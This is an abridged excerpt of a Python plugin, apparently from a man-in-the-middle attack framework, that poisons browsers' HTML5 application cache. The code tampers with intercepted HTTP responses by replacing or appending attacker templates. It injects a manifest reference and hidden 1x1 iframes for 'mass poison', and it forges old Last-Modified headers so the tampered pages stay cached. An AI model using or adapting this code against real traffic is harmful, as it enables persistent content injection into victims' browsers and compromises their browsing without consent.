...
class AppCachePlugin(Plugin):
	...
	def response(self, response, request, data):
		...
		if "enable_only_in_useragents" in self.app_config:
			...
			if regexp and not re.search(regexp, req_headers["user-agent"]):
				self.clientlog.info("Tampering disabled in this useragent ({})".format(req_headers["user-agent"]),
		...
		for url in urls:
			for name in self.app_config:
				if isinstance(self.app_config[name], dict):  # 'tis a section
					...
					elif (section.get('tamper_url', False) == url) or (
								section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url)):
						self.clientlog.info("Found URL in section '{}'!".format(name), extra=request.clientInfo)
						p = self.getTemplatePrefix(section)
						self.clientlog.info("Poisoning URL with tamper template: {}".format(p),
						                    extra=request.clientInfo)
						if os.path.exists(p + '.replace'):  # replace whole content
							f = open(p + '.replace', 'r')
							data = f.read()
							...
							f = open(p + '.append', 'r')
							appendix = f.read()
							data = re.sub(re.compile("</body>", re.IGNORECASE), appendix + "</body>",
							              data)  # append to body
							f.close()

						# add manifest reference
						data = re.sub(re.compile("<html", re.IGNORECASE),
						              "<html manifest=\"" + self.getManifestUrl(section) + "\"", data)
	...
	def tryMassPoison(self, url, data, headers, req_headers, ip):
		...
		if not headers.hasHeader('content-type') or not re.search('html(;|$)',
		                                                          headers.getRawHeaders('content-type')[0]):  # not HTML
			return data
		...
		self.clientlog.debug("Adding AppCache mass poison for URL {}, id {}".format(url, browser_id),
		                     extra=request.clientInfo)
	...
	def getMassPoisonHtml(self):
		...
		for i in self.app_config:
			if isinstance(self.app_config[i], dict):
				if self.app_config[i].has_key('tamper_url') and not self.app_config[i].get('skip_in_mass_poison',
				                                                                           False):
					html += "<iframe sandbox=\"\" style=\"opacity:0;visibility:hidden\" width=\"1\" height=\"1\" src=\"" + \
					        self.app_config[i]['tamper_url'] + "\"></iframe>"
	...
	def cacheForFuture(self, headers):
		...
		headers.setRawHeaders("Last-Modified",
		                      ["Mon, 29 Jun 1998 02:28:12 GMT"])  # it was modifed long ago, so is most likely fresh
